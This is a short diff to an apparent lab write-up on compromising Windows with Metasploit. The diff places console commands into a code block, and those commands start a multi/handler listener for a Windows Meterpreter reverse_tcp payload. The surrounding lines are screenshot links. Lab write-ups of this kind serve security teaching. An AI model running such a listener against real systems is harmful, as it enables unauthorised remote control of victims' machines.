@@ -58,12 +58,16 @@ Type help or a question mark "?" to see the list of all available commands you c
 
 ![Screenshot 2024-04-29 205928](https://github.com/VARSHINI22009118/Compromising-windows-using-Metasploit/assets/119401150/b58e80cf-6c8c-4917-9dfb-5c0b18626b3f)
 
-
+```
+/*
 Starting a command and control Server
 use multi/handler
 set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST 0.0.0.0
 exploit
+*/
+```
+
 ![Screenshot 2024-04-29 210014](https://github.com/VARSHINI22009118/Compromising-windows-using-Metasploit/assets/119401150/eddeb6f2-f369-4e62-8d5f-f84094478776)
 
 
